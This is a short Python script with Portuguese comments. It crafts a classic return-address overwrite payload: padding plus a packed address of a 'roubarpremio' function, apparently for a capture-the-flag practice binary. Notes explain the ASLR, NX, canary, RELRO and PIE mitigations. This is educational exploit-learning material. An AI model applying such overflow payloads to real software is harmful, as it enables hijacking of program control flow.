import struct
junk = "A"*20

address = struct.pack("<Q",0x4004f7); # simbolo roubarpremio, não é afetado pelo ASLR
print(junk + address)

# ASLR (Address Space Layout Randomization): proteção, posiciona objetos como endereço
# base do executal, stack, heap e posição das libs em um espaço aleatório que muda
# ao fim da execução do processo

# NX (No Execute): marca a stack / heap como não executável

# Canary: adiciona um "cookie" na stack, caso esse cookie seja sobreescrito com nosso
# junk é então detectado um buffer overflow, causando a chamada de um exit(), que não
# possui um ret, sem ret = sem exploit

# RELRO (Relocation Read-Only): basicamente previne escrita na tabela GOT
# sem GOT hijack :C

# PIE (Position Independent Executable): mini ASLR :P
